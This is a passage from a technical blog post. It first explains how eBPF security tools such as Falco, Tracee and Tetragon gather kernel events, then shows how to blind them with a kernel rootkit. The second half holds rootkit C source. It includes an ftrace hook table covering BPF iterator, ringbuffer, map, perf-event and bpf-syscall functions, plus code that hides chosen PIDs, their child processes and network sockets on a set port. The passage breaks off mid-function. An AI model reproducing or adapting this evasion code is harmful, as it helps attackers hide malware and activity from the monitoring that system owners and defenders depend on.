<h1 id="the-ebpf-security-landscape">The eBPF Security Landscape<a hidden class="anchor" aria-hidden="true" href="#the-ebpf-security-landscape">#</a></h1>
<h2 id="how-ebpf-security-works">How eBPF Security Works<a hidden class="anchor" aria-hidden="true" href="#how-ebpf-security-works">#</a></h2>
<p>eBPF (extended Berkeley Packet Filter) has revolutionized Linux observability and security. Modern security tools leverage eBPF to monitor kernel events in real-time without modifying kernel code or loading traditional kernel modules.</p>
<p><a href="https://mermaid.live/edit#pako:eNptktuO0zAQhl9l5N5mS9JNmzSgldJGK6HdStUWbiBcuM7koLp2NHYEparEFQ_AI_Bo-yS4yR4BR7Lm9_j_JrbnyIQukCWslPqrqDlZuL3LFYDpthXxtoYbJIUSNi0XeE4ApJ9zhov1NaxJuz17A6m1XNRYvNvSm6vNwQgupYH7H7_hpiW9xSG-3axy9mVgLBzjgZxxy2FjqRO2IzQ9471F4lbTYLxrVLXtyj5eIw3BirfmCbd8xt3__AUfDRJ8IK5Mq8n2xH8YKRE_DFJL6bIPMFRFrl7dQE97cf7MFdug6KixB0grVHb46Wsuhe6JrrRAHEK0xCut_qancHFxBYt-XvZzNiSE5MZkWMIOykbKZFRG7is9Y0nvMBmJSETIPaGlpmQUBMHbV67u0dWPZ1cpymL2Xxek3sJbwu7FSgadU8xjFTUFS9zboMf2SHt-lux43pkzW-Mec5a4sOC0y1muTs7TcvVJ6_2jjXRX1SwpuTROdW3BLWYNPzfO0yq5a0Fa6k5ZlgSTybynsOTIvjkdxePwMp5e-rNgPouj-cRjB5aEwTj2p0Ho-9Fk6ocnj33vq_rjOJr6bkznMz-chWHsMSwa10yrodP7hj_9AeJe_Hc"><img loading="lazy" src="https://mermaid.ink/img/pako:eNptktuO0zAQhl9l5N5mS9JNmzSgldJGK6HdStUWbiBcuM7koLp2NHYEparEFQ_AI_Bo-yS4yR4BR7Lm9_j_JrbnyIQukCWslPqrqDlZuL3LFYDpthXxtoYbJIUSNi0XeE4ApJ9zhov1NaxJuz17A6m1XNRYvNvSm6vNwQgupYH7H7_hpiW9xSG-3axy9mVgLBzjgZxxy2FjqRO2IzQ9471F4lbTYLxrVLXtyj5eIw3BirfmCbd8xt3__AUfDRJ8IK5Mq8n2xH8YKRE_DFJL6bIPMFRFrl7dQE97cf7MFdug6KixB0grVHb46Wsuhe6JrrRAHEK0xCut_qancHFxBYt-XvZzNiSE5MZkWMIOykbKZFRG7is9Y0nvMBmJSETIPaGlpmQUBMHbV67u0dWPZ1cpymL2Xxek3sJbwu7FSgadU8xjFTUFS9zboMf2SHt-lux43pkzW-Mec5a4sOC0y1muTs7TcvVJ6_2jjXRX1SwpuTROdW3BLWYNPzfO0yq5a0Fa6k5ZlgSTybynsOTIvjkdxePwMp5e-rNgPouj-cRjB5aEwTj2p0Ho-9Fk6ocnj33vq_rjOJr6bkznMz-chWHsMSwa10yrodP7hj_9AeJe_Hc?type=png" alt=""  />
</a></p>
<p><strong>Key Components:</strong></p>
<ol>
<li><strong>eBPF Programs</strong>: Sandboxed code running in kernel context, attached to various kernel events (syscalls, tracepoints, kprobes)</li>
<li><strong>BPF Maps</strong>: Kernel data structures for sharing information between eBPF programs and userspace</li>
<li><strong>Ringbuffers/Perf Events</strong>: Efficient mechanisms for streaming event data from kernel to userspace</li>
<li><strong>BPF Iterators</strong>: New mechanism for efficiently iterating over kernel objects (processes, network connections, etc.)</li>
</ol>
<p><strong>Security Tools Using eBPF:</strong></p>
<ul>
<li><strong>Falco</strong>: Runtime security monitoring, detects anomalous behavior</li>
<li><strong>Tracee</strong>: System call and event tracing for security analysis</li>
<li><strong>Tetragon</strong>: Policy enforcement and security observability</li>
<li><strong>Cilium</strong>: Network security and observability</li>
<li><strong>GhostScan</strong>: Rootkit detection via memory scanning</li>
<li><strong>Decloaker</strong>: Hidden process detection</li>
</ul>
<h2 id="the-false-promise-of-kernel-observability">The False Promise of Kernel Observability<a hidden class="anchor" aria-hidden="true" href="#the-false-promise-of-kernel-observability">#</a></h2>
<p>The security community believed eBPF solved a fundamental problem: how do you monitor a system that an attacker controls? The answer seemed obvious: use kernel-level observability that attackers cannot evade.</p>
<p>This assumption contains a critical flaw.</p>
<p><strong>The Fundamental Problem:</strong></p>
<p>eBPF programs execute <strong>inside</strong> the kernel they are trying to observe, while the detection pipeline depends on kernel → userspace delivery (ring buffers/perf buffers/iterators) and userspace policy engines. If an attacker gains the ability to load a kernel module (via root access and disabled Secure Boot / unenforced module signing), they can modify the kernel&rsquo;s behavior and selectively disrupt what those eBPF programs and collectors are able to see.</p>
<p><strong>Why This Matters:</strong></p>
<ul>
<li>eBPF programs cannot protect themselves from kernel-level manipulation</li>
<li>eBPF verifier only ensures memory safety, not security guarantees</li>
<li>All eBPF data flow mechanisms (iterators, ringbuffers, maps) are implemented as kernel functions</li>
<li>Kernel functions can be hooked via ftrace</li>
</ul>
<p>The moment an attacker has kernel-level access, observability becomes optional.</p>
<h1 id="understanding-the-attack-surface">Understanding the Attack Surface<a hidden class="anchor" aria-hidden="true" href="#understanding-the-attack-surface">#</a></h1>
<p><a href="https://mermaid.live/edit#pako:eNpt0ltvmzAUAOC_Yp28bBJFkJBAPGlSExJp6ipFXffSsQcH7IAAGx3MLo3y33dM10Rqw4Nlf-diS5wj5KaQwEE15ndeCrTs60OmGeuH_QFFV7I7iVo27FsncukCjN3-yECudlu2Q0M5bZ_Bz5fIiiJfrERhDV50TfpQ6QNbDUpJPHtKvpOo2OaX1PaSvyG_F90FtgTfe4nsEYXuO4P2f0jqItNuc_t45y4xxtaVZR-URXotK42p-49j7pjEbm4-s9W4bi-wfgvpW9i8giOq98fOzCekix2ur2F6DTfXcPseHeeN6PtUKiZszVTVNHwSi1BN915v0dSST6J9oMLYy01jkE-UUp_Oda6NKyQBDw5YFcAtDtKDVmIr3BGOLjsDW8pWZsBpWwisM8j0iWo6oZ-MaV_L0AyHErgSTU-noSuElWkl3AScFemPSFybQVvg4TSOxy7Aj_AHeBL40SyZzwJagnCeUPAv6cxPgnkYxctwOV0uZicPnsdbAz-J5wF98-UiiBZRlHggi4pG6_5lZMfJPf0D9aLPvQ"><img loading="lazy" src="https://mermaid.ink/img/pako:eNpt0ltvmzAUAOC_Yp28bBJFkJBAPGlSExJp6ipFXffSsQcH7IAAGx3MLo3y33dM10Rqw4Nlf-diS5wj5KaQwEE15ndeCrTs60OmGeuH_QFFV7I7iVo27FsncukCjN3-yECudlu2Q0M5bZ_Bz5fIiiJfrERhDV50TfpQ6QNbDUpJPHtKvpOo2OaX1PaSvyG_F90FtgTfe4nsEYXuO4P2f0jqItNuc_t45y4xxtaVZR-URXotK42p-49j7pjEbm4-s9W4bi-wfgvpW9i8giOq98fOzCekix2ur2F6DTfXcPseHeeN6PtUKiZszVTVNHwSi1BN915v0dSST6J9oMLYy01jkE-UUp_Oda6NKyQBDw5YFcAtDtKDVmIr3BGOLjsDW8pWZsBpWwisM8j0iWo6oZ-MaV_L0AyHErgSTU-noSuElWkl3AScFemPSFybQVvg4TSOxy7Aj_AHeBL40SyZzwJagnCeUPAv6cxPgnkYxctwOV0uZicPnsdbAz-J5wF98-UiiBZRlHggi4pG6_5lZMfJPf0D9aLPvQ?type=png" alt=""  />
</a></p>
<p>Before we can bypass eBPF security, we need to understand how these tools collect data. Let&rsquo;s examine each mechanism.</p>
<h2 id="bpf-iterators">BPF Iterators<a hidden class="anchor" aria-hidden="true" href="#bpf-iterators">#</a></h2>
<p>BPF iterators allow eBPF programs to efficiently walk kernel data structures. Security tools use iterators to enumerate processes, network connections, and other kernel objects.</p>
<p><strong>Iterator Flow:</strong></p>
<pre tabindex="0"><code>Kernel Data (tasks, sockets) 
    -&gt; bpf_iter_run_prog()
        -&gt; eBPF iterator program
            -&gt; bpf_seq_write() / bpf_seq_printf()
                -&gt; Userspace reads via seq_file
</code></pre><p><strong>Key Functions:</strong></p>
<ul>
<li><code>bpf_iter_run_prog()</code>: Executes the eBPF iterator program for each kernel object</li>
<li><code>bpf_seq_write()</code>: Writes data to the seq_file buffer</li>
<li><code>bpf_seq_printf()</code>: Formatted output to seq_file buffer</li>
</ul>
<p><strong>Security Tools Using Iterators:</strong></p>
<ul>
<li>GhostScan uses task iterators to detect hidden processes</li>
<li>Decloaker uses network iterators to find hidden connections</li>
<li>Custom security tools use iterators for forensic analysis</li>
</ul>
<h2 id="bpf-ringbuffers">BPF Ringbuffers<a hidden class="anchor" aria-hidden="true" href="#bpf-ringbuffers">#</a></h2>
<p>Ringbuffers are the modern replacement for perf buffers, providing efficient event streaming from kernel to userspace with better performance and ordering guarantees.</p>
<p><strong>Ringbuffer Flow:</strong></p>
<pre tabindex="0"><code>Kernel Event
    -&gt; eBPF program
        -&gt; bpf_ringbuf_reserve()
            -&gt; bpf_ringbuf_submit() or bpf_ringbuf_output()
                -&gt; Userspace reads events
</code></pre><p><strong>Key Functions:</strong></p>
<ul>
<li><code>bpf_ringbuf_reserve()</code>: Allocates space in the ringbuffer</li>
<li><code>bpf_ringbuf_submit()</code>: Commits reserved data to the ringbuffer</li>
<li><code>bpf_ringbuf_output()</code>: One-shot write to ringbuffer</li>
</ul>
<p><strong>Security Tools Using Event Delivery Mechanisms:</strong></p>
<ul>
<li><strong>Falco (modern eBPF probe)</strong>: Uses BPF ring buffer (BPF_MAP_TYPE_RINGBUF) for kernel→userspace event delivery (driver/config dependent).</li>
<li><strong>Tracee</strong>: Uses perfbuffer/perf ring buffers as its primary kernel→userspace event delivery mechanism (and can vary by version/implementation).</li>
<li><strong>Tetragon</strong>: Uses kernel→userspace buffering mechanisms (e.g., ring buffer / perf-based buffers) depending on the component and version.</li>
</ul>
<p>Note: &ldquo;Perf event arrays&rdquo; and &ldquo;BPF ring buffers&rdquo; are different mechanisms - the former is per-CPU and older, while the latter is shared across CPUs and more efficient.</p>
<h2 id="perf-events">Perf Events<a hidden class="anchor" aria-hidden="true" href="#perf-events">#</a></h2>
<p>Perf events are the traditional mechanism for streaming kernel data to userspace. While older than ringbuffers, many tools still use them.</p>
<p><strong>Perf Event Flow:</strong></p>
<pre tabindex="0"><code>Kernel Event
    -&gt; eBPF program
        -&gt; perf_event_output()
            -&gt; perf_trace_run_bpf_submit()
                -&gt; Userspace reads perf buffer
</code></pre><p><strong>Key Functions:</strong></p>
<ul>
<li><code>perf_event_output()</code>: Writes event to perf buffer</li>
<li><code>perf_trace_run_bpf_submit()</code>: Submits tracepoint data to eBPF programs</li>
</ul>
<p><strong>Security Tools Using Perf Events:</strong></p>
<ul>
<li>Legacy Falco versions</li>
<li>Custom monitoring tools</li>
<li>Kernel tracing utilities</li>
</ul>
<h2 id="bpf-maps">BPF Maps<a hidden class="anchor" aria-hidden="true" href="#bpf-maps">#</a></h2>
<p>BPF maps are kernel data structures that store state and allow communication between eBPF programs and userspace.</p>
<p><strong>Map Operations:</strong></p>
<pre tabindex="0"><code>eBPF program or userspace
    -&gt; bpf_map_lookup_elem()
    -&gt; bpf_map_update_elem()
    -&gt; bpf_map_delete_elem()
        -&gt; Kernel map data structure
</code></pre><p><strong>Key Functions:</strong></p>
<ul>
<li><code>bpf_map_lookup_elem()</code>: Retrieve value from map</li>
<li><code>bpf_map_update_elem()</code>: Insert or update map entry</li>
<li><code>bpf_map_delete_elem()</code>: Remove map entry</li>
</ul>
<p><strong>Security Use Cases:</strong></p>
<ul>
<li>Storing process metadata</li>
<li>Tracking network connections</li>
<li>Maintaining allow/deny lists</li>
<li>Sharing data between eBPF programs</li>
</ul>
<h1 id="bypassing-ebpf-security-technical-implementation">Bypassing eBPF Security: Technical Implementation<a hidden class="anchor" aria-hidden="true" href="#bypassing-ebpf-security-technical-implementation">#</a></h1>
<p>Now that we understand how eBPF security works, let&rsquo;s examine how to systematically blind it.</p>
<h2 id="hook-architecture">Hook Architecture<a hidden class="anchor" aria-hidden="true" href="#hook-architecture">#</a></h2>
<p>Our approach uses ftrace to hook critical BPF functions. Ftrace allows dynamic tracing of kernel functions without modifying kernel code, making it perfect for interception.</p>
<p><a href="https://mermaid.live/edit#pako:eNplk2FvmzAQhv-K5XylGQESCJsqLWknRV2kKOqHaWNCBs4EBWx22G3SKP99xkkTNeWLudf3vHc-8IHmsgAaU17L13zDUJHnWSII-f789CehT4ACarKWUm0rRRZCAebQqkoK8pPtARP6NxHnfHJ3d08WhlqYLKYkdt8y_HKftTytjJKiFmmLsryoHfxLX9HsfVBarITi1vhquza260qUZKY5B7wAJrfMtFmhA3yBT3qns6ZSn2SpVavVTY2VqbEC5OTxBYQ6Nd-aOIU-PjNXVSHLwR7Kdm4L3TgujeNs9YMsWXudRcPatJZyq9sUamg-6LotmAKr31j9MlaPO8i1nf2KqY0FU1u8n2rfyQ0zN8xcCoWyJquaCTgju0mQdvuuR89KxXzvXbp80rxmXfcAnDC1Jbyq63gQshH3MqczlluIB0Hm8lHo5LKWGA84518vnG3CgEahDi2xKmisUINDG8CG9SE99NkJVRtoIKGxeS0YbhOaiKNhWiZ-S9m8Yyh1uaExZ3VnotOgHipWImsuKoIoAOdSC0XjkTcNrQuND3RH48l4GPjR2PN8fxK6fhQ4dG-ypt4wcscjL4h8d-qPPO_o0Ddb1x1G4dg1z3g6cYNJEEQOhaIyP_bydGfs1Tn-B4drFvg"><img loading="lazy" src="https://mermaid.ink/img/pako:eNplk2FvmzAQhv-K5XylGQESCJsqLWknRV2kKOqHaWNCBs4EBWx22G3SKP99xkkTNeWLudf3vHc-8IHmsgAaU17L13zDUJHnWSII-f789CehT4ACarKWUm0rRRZCAebQqkoK8pPtARP6NxHnfHJ3d08WhlqYLKYkdt8y_HKftTytjJKiFmmLsryoHfxLX9HsfVBarITi1vhquza260qUZKY5B7wAJrfMtFmhA3yBT3qns6ZSn2SpVavVTY2VqbEC5OTxBYQ6Nd-aOIU-PjNXVSHLwR7Kdm4L3TgujeNs9YMsWXudRcPatJZyq9sUamg-6LotmAKr31j9MlaPO8i1nf2KqY0FU1u8n2rfyQ0zN8xcCoWyJquaCTgju0mQdvuuR89KxXzvXbp80rxmXfcAnDC1Jbyq63gQshH3MqczlluIB0Hm8lHo5LKWGA84518vnG3CgEahDi2xKmisUINDG8CG9SE99NkJVRtoIKGxeS0YbhOaiKNhWiZ-S9m8Yyh1uaExZ3VnotOgHipWImsuKoIoAOdSC0XjkTcNrQuND3RH48l4GPjR2PN8fxK6fhQ4dG-ypt4wcscjL4h8d-qPPO_o0Ddb1x1G4dg1z3g6cYNJEEQOhaIyP_bydGfs1Tn-B4drFvg?type=png" alt=""  />
</a></p>
<p><strong>Hooked Functions:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="k">struct</span> <span class="n">ftrace_hook</span> <span class="n">hooks</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="c1">// BPF Iterator Hooks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_iter_run_prog&#34;</span><span class="p">,</span> <span class="n">hook_bpf_iter_run_prog</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_iter_run_prog</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_seq_write&#34;</span><span class="p">,</span> <span class="n">hook_bpf_seq_write</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_seq_write</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_seq_printf&#34;</span><span class="p">,</span> <span class="n">hook_bpf_seq_printf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_seq_printf</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// BPF Ringbuffer Hooks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_ringbuf_output&#34;</span><span class="p">,</span> <span class="n">hook_bpf_ringbuf_output</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_ringbuf_output</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_ringbuf_reserve&#34;</span><span class="p">,</span> <span class="n">hook_bpf_ringbuf_reserve</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_ringbuf_reserve</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_ringbuf_submit&#34;</span><span class="p">,</span> <span class="n">hook_bpf_ringbuf_submit</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_ringbuf_submit</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// BPF Map Hooks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_map_lookup_elem&#34;</span><span class="p">,</span> <span class="n">hook_bpf_map_lookup_elem</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_map_lookup_elem</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;bpf_map_update_elem&#34;</span><span class="p">,</span> <span class="n">hook_bpf_map_update_elem</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_map_update_elem</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// Perf Event Hooks
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;perf_event_output&#34;</span><span class="p">,</span> <span class="n">hook_perf_event_output</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_perf_event_output</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;perf_trace_run_bpf_submit&#34;</span><span class="p">,</span> <span class="n">hook_perf_trace_run_bpf_submit</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">         <span class="o">&amp;</span><span class="n">orig_perf_trace_run_bpf_submit</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// BPF Program Execution
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;__bpf_prog_run&#34;</span><span class="p">,</span> <span class="n">hook_bpf_prog_run</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_prog_run</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="c1">// BPF Syscall
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;__x64_sys_bpf&#34;</span><span class="p">,</span> <span class="n">hook_bpf</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="nf">HOOK</span><span class="p">(</span><span class="s">&#34;__ia32_sys_bpf&#34;</span><span class="p">,</span> <span class="n">hook_bpf_ia32</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">orig_bpf_ia32</span><span class="p">),</span>
</span></span><span class="line"><span class="cl"><span class="p">};</span>
</span></span></code></pre></div><p><strong>Why This Works:</strong></p>
<ol>
<li><strong>Kernel-level access</strong>: Once loaded, the rootkit runs at ring 0 with full privileges</li>
<li><strong>Ftrace hooking</strong>: Operates below eBPF programs, allowing us to filter their data sources</li>
<li><strong>No eBPF involvement</strong>: We&rsquo;re not fighting eBPF, we&rsquo;re cutting off its inputs</li>
<li><strong>Selective filtering</strong>: Only hide specific processes/connections, not everything</li>
</ol>
<h2 id="process-and-network-hiding">Process and Network Hiding<a hidden class="anchor" aria-hidden="true" href="#process-and-network-hiding">#</a></h2>
<p>The rootkit maintains lists of hidden PIDs and network connections. Child process tracking ensures that when you hide a shell, all spawned processes also remain hidden.</p>
<p><strong>Hidden PID Management:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define MAX_HIDDEN_PIDS 32
</span></span></span><span class="line"><span class="cl"><span class="cp">#define MAX_CHILD_PIDS (MAX_HIDDEN_PIDS * 128)
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">int</span> <span class="n">hidden_pids</span><span class="p">[</span><span class="n">MAX_HIDDEN_PIDS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">int</span> <span class="n">hidden_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">int</span> <span class="n">child_pids</span><span class="p">[</span><span class="n">MAX_CHILD_PIDS</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">extern</span> <span class="kt">int</span> <span class="n">child_count</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">void</span> <span class="nf">add_hidden_pid</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">hidden_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="p">(</span><span class="n">hidden_pids</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">pid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">             <span class="k">return</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hidden_count</span> <span class="o">&lt;</span> <span class="n">MAX_HIDDEN_PIDS</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">hidden_pids</span><span class="p">[</span><span class="n">hidden_count</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">pid</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">notrace</span> <span class="kt">int</span> <span class="nf">is_hidden_pid</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">hidden_count</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">         <span class="k">if</span> <span class="p">(</span><span class="n">hidden_pids</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">pid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">             <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Child Process Tracking:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">bool</span> <span class="nf">is_child_of_hidden_process</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">task</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">task_struct</span> <span class="o">*</span><span class="n">parent</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">depth</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">max_depth</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="kt">bool</span> <span class="n">hidden</span> <span class="o">=</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">pid</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nf">should_hide_pid_by_int</span><span class="p">(</span><span class="n">pid</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">rcu_read_lock</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">task</span> <span class="o">=</span> <span class="nf">pid_task</span><span class="p">(</span><span class="nf">find_vpid</span><span class="p">(</span><span class="n">pid</span><span class="p">),</span> <span class="n">PIDTYPE_PID</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">task</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nf">rcu_read_unlock</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">parent</span> <span class="o">=</span> <span class="n">task</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">parent</span> <span class="o">&amp;&amp;</span> <span class="n">depth</span> <span class="o">&lt;</span> <span class="n">max_depth</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">pid</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">parent</span> <span class="o">=</span> <span class="nf">rcu_dereference</span><span class="p">(</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">real_parent</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">parent</span> <span class="o">||</span> <span class="n">parent</span><span class="o">-&gt;</span><span class="n">pid</span> <span class="o">&lt;=</span> <span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nf">should_hide_pid_by_int</span><span class="p">(</span><span class="n">parent</span><span class="o">-&gt;</span><span class="n">pid</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">hidden</span> <span class="o">=</span> <span class="nb">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="n">depth</span><span class="o">++</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="nf">rcu_read_unlock</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hidden</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p><strong>Network Connection Hiding:</strong></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define HIDDEN_PORT 8081
</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">notrace</span> <span class="kt">bool</span> <span class="nf">should_hide_socket_port</span><span class="p">(</span><span class="k">struct</span> <span class="n">sock_common</span> <span class="o">*</span><span class="n">sk</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">__be16</span> <span class="n">sport</span><span class="p">,</span> <span class="n">dport</span><span class="p">;</span>
